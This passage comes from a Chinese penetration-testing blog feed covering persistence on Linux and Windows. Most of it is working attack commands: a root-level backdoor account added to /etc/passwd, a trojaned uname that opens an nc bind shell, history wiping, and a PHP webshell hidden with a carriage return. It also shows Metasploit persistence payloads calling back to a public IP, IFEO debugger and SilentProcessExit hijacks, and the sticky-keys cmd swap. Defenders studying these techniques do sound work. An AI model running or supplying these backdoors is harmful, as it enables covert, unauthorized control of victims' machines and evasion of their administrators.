class="comment">#尝试直接将UID（用户ID）:GID（组ID）改为0，即root权限登录</span></span><br></pre></td></tr></table></figure><h1 id="后门账号"><a href="#后门账号" class="headerlink" title="后门账号"></a>后门账号</h1><blockquote><p>不仅仅修改uid、gid，也可以创建后门账号</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;print crypt(&quot;alvin&quot;,&quot;adgfagm&quot;).&quot;\n&quot;&#x27;</span></span><br><span class="line">adt5Dy6c9PSDw</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;weblogic1:adt5Dy6c9PSDw:0:0:root:/root:/bin/bash&quot;</span>&gt;&gt;/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#用户名weblogic1，密码：alvin</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209050053093.png" alt="image-20220905005301882"></p><h1 id="uname后门"><a href="#uname后门" class="headerlink" title="uname后门"></a>uname后门</h1><blockquote><p>类似alias的后门</p><p><a href="https://github.com/iamckn/backdoors">https://github.com/iamckn/backdoors</a></p></blockquote><blockquote><p><a href="https://github.com/iamckn/backdoors/blob/master/bd_uname.sh">bd_uname.sh</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#uname</span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="built_in">touch</span> /usr/local/bin/uname</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt;&gt; /usr/local/bin/uname</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">#正向shell的命令,有四种可以选择，</span></span><br><span class="line"><span class="string">nc.traditional -l -v -p 4444 -e /bin/bash 2&gt;/dev/null &amp;</span></span><br><span class="line"><span class="string">#socat TCP4-Listen:3177,fork EXEC:/bin/bash 2&gt;/dev/null &amp;</span></span><br><span class="line"><span class="string">#socat SCTP-Listen:1177,fork EXEC:/bin/bash 2&gt;/dev/null &amp;</span></span><br><span class="line"><span class="string">#perl -MIO -e&#x27;$s=new IO::Socket::INET(LocalPort=&gt;1337,Listen=&gt;1);while($c=$s-&gt;accept())&#123;$_=&lt;$c&gt;;print $c `$_`;&#125;&#x27; 2&gt;/dev/null &amp;</span></span><br><span class="line"><span class="string">#实际执行的命令</span></span><br><span class="line"><span class="string">/bin/uname \$@</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/uname</span><br></pre></td></tr></table></figure><blockquote><p> 上面脚本简洁的看就是执行下面两个命令：<code>nc -l -v -p 4444 -e /bin/bash 2&gt;/dev/null</code>和<code>/bin/uname $@</code></p><p>#正向shell的命令</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">nc -l -v -p 4444 -e /bin/bash 2&gt;/dev/null &amp; /bin/uname <span class="variable">$@</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#输入ip加端口连接即可</span></span><br><span class="line">nc ip 4444</span><br></pre></td></tr></table></figure><h1 id="Linux隐藏技巧"><a href="#Linux隐藏技巧" class="headerlink" title="Linux隐藏技巧"></a>Linux隐藏技巧</h1><h2 id="简单文件隐藏"><a href="#简单文件隐藏" class="headerlink" title="简单文件隐藏"></a>简单文件隐藏</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> .mingy.py</span><br><span class="line"><span class="built_in">ls</span> -la</span><br></pre></td></tr></table></figure><h2 id="隐藏权限"><a href="#隐藏权限" class="headerlink" title="隐藏权限"></a>隐藏权限</h2><p>chattr命令可以给文件加锁，防止被删除，我们也可以将它利用起来</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr +i 1.txt</span><br><span class="line"><span class="comment">#加锁后即使是root也没办法删除</span></span><br><span class="line"><span class="comment">#恢复</span></span><br><span class="line">chattr -i 1.txt</span><br></pre></td></tr></table></figure><h2 id="隐藏历史记录"><a href="#隐藏历史记录" class="headerlink" title="隐藏历史记录"></a>隐藏历史记录</h2><blockquote><p>拿到shell以后，开启无痕模式，禁用命令历史记录功能</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> +o <span class="built_in">history</span></span><br></pre></td></tr></table></figure><blockquote><p>恢复</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -o <span class="built_in">history</span></span><br></pre></td></tr></table></figure><h2 id="删除历史命令"><a href="#删除历史命令" class="headerlink" title="删除历史命令"></a>删除历史命令</h2><p>删除100行以后的操作命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&quot;100,<span class="variable">$d</span>&quot;</span> .bash_history</span><br></pre></td></tr></table></figure><h2 id="linux系统下的特性：-r"><a href="#linux系统下的特性：-r" class="headerlink" title="linux系统下的特性：\r"></a>linux系统下的特性：<code>\r</code></h2><blockquote><p> 通过cat查看不到\r字符前面的内容，但是vim编辑文件可以看到</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;&lt;?=\`\$_POST[cmd]\`?&gt;\r&lt;?=&#x27;mingy&#x27;;?&gt;&quot;</span> &gt;/var/www/html/1ndex.php</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231338946.png" alt="image-20220823133808817"></p><p>可正常请求webshell</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x30 - Windows权限维持</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x30-Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x30-Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="权限维持简介"><a href="#权限维持简介" class="headerlink" title="权限维持简介"></a>权限维持简介</h1><p>为了保证获取到的目标权限不会因为漏洞的修复而丢失，攻击者通常会在目标上安装一个后门，来保证对目标的持久化控制。</p><h1 id="Meterpreter权限维持"><a href="#Meterpreter权限维持" class="headerlink" title="Meterpreter权限维持"></a>Meterpreter权限维持</h1><p>meterpreter中的权限维持技术有两种类型：</p><ul><li>persistence（注册表后门）</li></ul><blockquote><p>在有杀软的环境下，一般修改注册表项会被杀软监控，杀软都会盯着这些敏感注册表项，所以修改注册表的方式，在有杀软的环境下不建议使用~动静大。</p></blockquote><ul><li>metsvc 的后门（服务后门）</li></ul><h2 id="Persistence（已弃用）"><a href="#Persistence（已弃用）" class="headerlink" title="Persistence（已弃用）"></a>Persistence（已弃用）</h2><blockquote><p>虽然弃用了，但是msf上还是有啦</p></blockquote><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Persistence 模块是先上传 vbs脚本，然后执行 vbs脚本修改注册表<code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> 从而完成自启动。（注册表中写入的是vbs脚本路径，方便自启动vbs脚本）</p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>开机自启动，但是容易被杀软查杀。</p><h3 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run persistence -h</span><br><span class="line">-A：自动启动一个匹配的漏洞/多/处理程序来连接到代理</span><br><span class="line">-X：开机启动，注册表位置：    HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">-U：当前用户登录后自启动，注册表位置：    HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">-S：作为服务启动，注册表位置：    HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">-T：选择要使用的可执行模板</span><br><span class="line">-L：后门传到远程主机的位置默认为 %TEMP%</span><br><span class="line">-P：使用的Payload，默认windows/meterpreter/reverse_tcp，该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行</span><br><span class="line">-i：设置反向连接间隔时间，单位为秒，每隔五秒重启</span><br><span class="line">-p：设置反向连接的端口号</span><br><span class="line">-r：设置反向连接的ip地址</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run persistence -U -X -i 5 -P windows/x64/meterpreter/reverse_tcp -p 4444 -r 192.168.78.117</span><br></pre></td></tr></table></figure><blockquote><p>解释一下这条命令具体干了上面：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240046198.png" alt="image-20220824004626002"></p><p>上图中可以看到生成了一个文件，我们在本地查看一下</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240045868.png" alt="image-20220824004558722"></p><p>可以看到这个文件执行了两个命令，一个是清除了vbs，一个是删除了注册表项（这是在做痕迹清除的事情）</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240051115.png" alt="image-20220824005131983"></p><p>可以看到向目标主机写入vbs脚本内容，并执行</p><p>执行后运行了一个进程，该进程会与msf通信生成一个新的session</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240052263.png" alt="image-20220824005228117"></p><p>运行 PID为4816 修改注册表项自启动~~~</p><p>可以用SysinternalsSuite工具集中的autorun方便的查看变化~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240107737.png" alt="image-20220824010723561" style="zoom: 33%;" /></blockquote><p>当使用 run persistence 进行持久化时默认文件上传的远程路径会推送到 %TEMP% 目录下(“C:\Users\AppData\Local\Temp&quot;)，当用户重启时， persistence 持久化就可能会出错。可以通过 -L  参数指定vbs脚本上传的位置。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run persistence -i 5 -p 4444 -r 192.168.78.117 -L C:\\Windows\\System32</span><br></pre></td></tr></table></figure><p>该命令脚本注册自启动注册表位置：HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</p><h2 id="Metsvc模块（已弃用）"><a href="#Metsvc模块（已弃用）" class="headerlink" title="Metsvc模块（已弃用）"></a>Metsvc模块（已弃用）</h2><p>metsvc  模块是开机自启动的<strong>服务型后门</strong>，msf集成的权限持久化模块，通过服务启动，服务名是 meterpreter ，监听端口是31337。（Windows系统下 服务一般是随着系统启动而启动）不好用-再试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run metsvc -h   # 模块信息</span><br><span class="line">run metsvc -A   # 启动服务（自动启动 exploit/multi/handler 连接服务）</span><br><span class="line">run metsvc -r   # 卸载服务（文件必须手动删除）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br></pre></td></tr></table></figure><blockquote><p>执行后干了什么：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240113410.png" alt="image-20220824011334231"></p><p>上传文件 启动服务 安装服务 生成会话~~这样子一个过程</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240115662.png" alt="image-20220824011547504"></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211328268.png" alt="image-20220821132831052" style="zoom: 33%;" /><h2 id="exploit-x2F-windows-x2F-local-x2F-persistence"><a href="#exploit-x2F-windows-x2F-local-x2F-persistence" class="headerlink" title="exploit&#x2F;windows&#x2F;local&#x2F;persistence"></a>exploit&#x2F;windows&#x2F;local&#x2F;persistence</h2><p>在新版的msf中以上两个模块都已被弃用，功能都包含到了此模块中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/persistence</span><br><span class="line">set session 1</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELAY     10               yes       持久性有效载荷不断重新连接回来的延迟（秒）。</span><br><span class="line">EXE_NAME                   no        将在目标主机上使用的有效载荷的文件名（默认为%RAND%.exe）。</span><br><span class="line">PATH                       no        写入有效载荷的路径（默认为%TEMP%）。</span><br><span class="line">REG_NAME                   no        在目标主机上调用注册表值进行持久化的名称（默认为%RAND%）。</span><br><span class="line">SESSION   1                yes       运行该模块的会话</span><br><span class="line">STARTUP   USER             yes       持久性有效载荷的启动类型。(接受：USER, SYSTEM)</span><br><span class="line">VBS_NAME                   no        目标主机上的VBS持久化脚本要使用的文件名（默认为%RAND%）。</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211330638.png" alt="image-20220821133003386" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211330078.png" alt="image-20220821133018914" style="zoom:50%;" /><h2 id="Autorunscript"><a href="#Autorunscript" class="headerlink" title="Autorunscript"></a>Autorunscript</h2><p>获取shell的时候自动执行持续化脚本，可以被 Autorunscript 执行的命令目录在 metasploit&#x2F;scripts&#x2F;meterpreter 。、</p><p>一上线就立马做权限维持~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#persistence</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.78.117</span><br><span class="line">set LPORT 5555</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set AutoRunScript persistence -r 192.168.78.117 -p 5556 -U -X -i 30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#metsvc</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.78.117</span><br><span class="line">set LPORT 5555</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set AutoRunScript metsvc -A</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h1 id="系统工具替换后门-IFEO映像劫持"><a href="#系统工具替换后门-IFEO映像劫持" class="headerlink" title="系统工具替换后门-IFEO映像劫持"></a>系统工具替换后门-IFEO映像劫持</h1><blockquote><p>以前喜欢用的方法</p><p>参考：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/96504762">IFEO映像劫持在实战中的使用</a></li></ul></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Windows  的辅助功能提供了额外的选项（屏幕键盘，放大镜，屏幕阅读等），可以帮助特殊人士更容易地使用操作系统。然而，这种功能可能会被<strong>滥用于</strong>在**&#x3D;&#x3D;启用 RDP&#x3D;&#x3D;  并&#x3D;&#x3D;获得 Administrator  权限&#x3D;&#x3D;的主机<strong>上实现持久化访问。这种技术会</strong>接触磁盘，或者需要修改注册表来执行远程存储的 payload<strong>。<br>涉及到的注册表项为 IFEO（Image File Execution Options镜像文件执行选项） ，</strong>默认是只有管理员和local system有权读写修改。** </p><blockquote><ul><li>前提：</li></ul><blockquote><ul><li>启用 RDP,获得了远程桌面</li></ul><blockquote><p>并不需要我们一直拥有远程桌面，只要他开启了远程桌面的服务，我们即使密码错误也可以到达下图中的界面，只要到达此界面，我们就可以触发劫持的后门程序~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208241921771.png" alt="image-20220824192140582" style="zoom:33%;" /></blockquote><ul><li>获得 Administrator  权限的主机</li></ul></blockquote><ul><li>注册表添加操作：</li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add去查看命令参数</span><br><span class="line"> /v       所选项之下要添加的值名称。</span><br><span class="line"> /t       RegKey 数据类型</span><br><span class="line">           [ REG_SZ    | REG_MULTI_SZ | REG_EXPAND_SZ |</span><br><span class="line">             REG_DWORD | REG_QWORD    | REG_BINARY    | REG_NONE ]</span><br><span class="line">           如果忽略，则采用 REG_SZ。</span><br><span class="line">     /d       要分配给添加的注册表 ValueName 的数据。</span><br><span class="line"> /f       不用提示就强行覆盖现有注册表项。     </span><br></pre></td></tr></table></figure></blockquote><ul><li>涉及注册表项：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</span><br></pre></td></tr></table></figure></blockquote><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>当我们按照常理运行属于IFEO列表的文件的时候,会执行相关的选项参数，这里我们主要利用的参数是 <strong>&#x3D;&#x3D;debugger&#x3D;&#x3D;</strong> ,通过该参数我们可以实现偷梁换柱。</p><blockquote><p>注意：</p><ul><li>即&#x3D;&#x3D;可执行文件的文件名&#x3D;&#x3D;只要在上述的注册表项下，出于简化原因，IFEO使用&#x3D;&#x3D;忽略路径的方式&#x3D;&#x3D;来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就可以正常运行。</li></ul></blockquote><p>核心思路就是在唤醒这些辅助功能的时候，顺带唤醒我们的后门程序~就可以达到我们的目的。实际上就是劫持正常程序替换为我们的后门程序~~~</p><h2 id="常用辅助功能"><a href="#常用辅助功能" class="headerlink" title="常用辅助功能"></a>常用辅助功能</h2><blockquote><p>win+R 运行osk即可使用屏幕键盘，其他亦是类似</p></blockquote><ol><li>Shift（sethc）</li><li>屏幕键盘（osk）</li></ol><blockquote><p>如图所示~~在锁屏时，我们也可以通过轻松访问选项，轻易的唤醒这些程序，什么屏幕键盘啊，讲述人啊，唤醒后，我们就可以顺带的执行我们的后门程序~，是不是很nice</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208241318882.png" alt="image-20220824131837506" style="zoom: 25%;" /></blockquote><ol start="3"><li><p>辅助工具管理器（Utilman）</p></li><li><p>讲述人（Narrator）</p></li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="IE"><a href="#IE" class="headerlink" title="IE"></a>IE</h3><p>以修改IE启动程序为例，实现运行IE程序但是启动的却是cmd。</p><ol><li>找到注册表 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>  目录下的 iexplore.exe</li><li>添加一个 debugger 字符串键值，并且赋值为 cmd.exe  的执行路径: <code>C:Windows\system32\cmd.exe</code></li><li>运行 iexplore.exe</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f      </span><br></pre></td></tr></table></figure><h3 id="Narrator"><a href="#Narrator" class="headerlink" title="Narrator"></a>Narrator</h3><p>劫持 Narrator  讲述人</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><blockquote><p>并且要注意到：</p><ul><li><p>Narrator讲述人这种“轻松访问”里面的功能，都不需要登录，即可唤醒~~</p><p>这意味着什么呢？意味着我们即使输入了错误的密码，也可以通过点击远程桌面的外面“轻松服务”的功能，来执行我们的后门程序~</p><p>我们只需要用如上方式劫持这些服务即可~~~</p></li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208241916409.png" alt="image-20220824191658167" style="zoom: 33%;" /></blockquote><ul><li>演示：</li></ul><p>我们按照上述方式将我们的msf后门程序的位置写入注册表：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\Users\Administrator\Desktop\msf_6666_win64.exe&quot; /f</span><br></pre></td></tr></table></figure><p>在msf开启监听：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p windows/x64/meterpreter_reverse_tcp -H 124.223.217.243 -P 6666</span><br></pre></td></tr></table></figure><p>触发narrator.exe:</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208242010233.png" alt="image-20220824201031038" style="zoom:33%;" /><p>msf接收到会话~~</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208242043464.png" alt="image-20220824204333272"></p></blockquote><h3 id="Utilman"><a href="#Utilman" class="headerlink" title="Utilman"></a>Utilman</h3><p>劫持辅助工具管理器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><h3 id="Notepad（较隐蔽）"><a href="#Notepad（较隐蔽）" class="headerlink" title="Notepad（较隐蔽）"></a>Notepad（较隐蔽）</h3><blockquote><p>比较隐蔽的一种，而且记事本用户用的也算比较多~~。&#x3D;&#x3D;这种劫持呢，不会影响正常程序的执行&#x3D;&#x3D;~</p></blockquote><p>实现原程序退出后静默运行后门程序。以执行 notepad  为例，退出后静默运行 calc.exe</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;C:\Windows\system32\calc.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#这后面两步，修改的注册表项是HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe的内容</span><br><span class="line">当用户退出后，用户会执行一个程序calc.exe</span><br><span class="line">SilentProcessExit表示程序退出后，会静默执行~~</span><br></pre></td></tr></table></figure><h3 id="Shift"><a href="#Shift" class="headerlink" title="Shift"></a>Shift</h3><blockquote><p>l连按五次shift，即使是锁屏，连续按五次sheift也会唤出粘滞键</p></blockquote><p>在 windows  登陆的时候按五次 shift  打开 cmd  进行操作。</p><p>前提条件:在将C盘windows目录下面的system32文件夹可写的情况下，将里面的 sethc.exe  应用程序进行转移，并生成 sethc.exe.bak  文件。并将 cmd.exe  拷贝覆盖 sethc.exe 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir sethc.exe</span><br><span class="line">move sethc.exe sethc.exe.bak</span><br><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure><p>但是在 windows xp 过后，sethc组件属于完全受信用的&#x3D;&#x3D;用户 TrustInstall&#x3D;&#x3D; ，我们无法修改名字</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250058068.png" alt="image-20220825005849922"></p><p>这时候即使 administrators 都只有名义上的只读和可执行权，我们可以&#x3D;&#x3D;手动修改其所属为 administrators&#x3D;&#x3D; ，步骤如下：（这个步骤其实如果拿不到远程桌面还是很难搞的，搞定了权限问题，才能进行替换伪造！）</p><blockquote><ol><li>右键属性&#x2F;安全&#x2F;高级</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250105955.png" alt="image-20220825010524695" style="zoom: 33%;" /><ol start="2"><li>所有者&#x2F;编辑&#x2F;添加当前用户&#x2F;应用&#x2F;确定</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250107050.png" alt="image-20220825010756762" style="zoom:33%;" /><ol start="3"><li><p>关闭窗口</p></li><li><p>右键属性&#x2F;安全&#x2F;编辑</p></li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250110801.png" alt="image-20220825011030550" style="zoom:33%;" /><ol start="5"><li>选择Administrators(或者你的当前组)&#x2F;勾选完全控制&#x2F;确定</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250111590.png" alt="image-20220825011117423" style="zoom:33%;" /><p>修改完权限之后，才能正常进行操作：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250113623.png" alt="image-20220825011351506"></p><p>此时，按五次 shift  就可以打开 cmd了~~~~  </p></blockquote><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><blockquote><p>上述的各种劫持方式，在msf中有自动化的工具~~</p><p>Metasploit 框架提供了一个后渗透模块，可实现自动化地利用沾滞键的权限维持技术。该模块将用 CMD 替代辅助功能的二进制文件（&#x3D;&#x3D;sethc, osk, disp, utilman&#x3D;&#x3D;）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/manage/sticky_keys</span><br><span class="line">show options</span><br><span class="line">修改target、session</span><br><span class="line">exe选项可以修改为自定义的后门程序</span><br></pre></td></tr></table></figure><p>当目标主机的屏幕被锁定时，执行 osk 屏幕键盘工具将会打开一个具有 system 级别权限的命令提示符。</p><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211339693.png" alt="image-20220821133932476" style="zoom:33%;" /></blockquote><h1 id="开机自启动注册表项"><a href="#开机自启动注册表项" class="headerlink" title="开机自启动注册表项"></a>开机自启动注册表项</h1><blockquote><ul><li>注册表的 <strong>HKEY_LOCAL_MACHINE  和 HKEY_CURRENT_USER  键的区别</strong>：前者对所有用户有效，后者只对当前用户有效</li><li>电脑启动的时候就会从注册表中启动相应的配置</li><li>msconfig命令查看启动项</li></ul></blockquote><h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><p>每次启动登录时都会按顺序自动执行。对这些注册表项要有一个清楚的认知~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure><h2 id="RunOnce"><a href="#RunOnce" class="headerlink" title="RunOnce"></a>RunOnce</h2><p>仅会被自动执行一次</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure><h2 id="RunServicesOnce"><a href="#RunServicesOnce" class="headerlink" title="RunServicesOnce"></a>RunServicesOnce</h2><p>程序会在系统加载时自动启动执行一次</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br></pre></td></tr></table></figure><h2 id="RunServices"><a href="#RunServices" class="headerlink" title="RunServices"></a>RunServices</h2><p>RunServices是继RunServicesOnce之后启动的程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices</span><br></pre></td></tr></table></figure><h2 id="RunOnceEx"><a href="#RunOnceEx" class="headerlink" title="RunOnceEx"></a>RunOnceEx</h2><p><strong>Windows XP&#x2F;2003 特有的自启动注册表项</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx</span><br></pre></td></tr></table></figure><h2 id="Load"><a href="#Load" class="headerlink" title="Load"></a>Load</h2><figure class="highlight plaintext"><table><tr><td 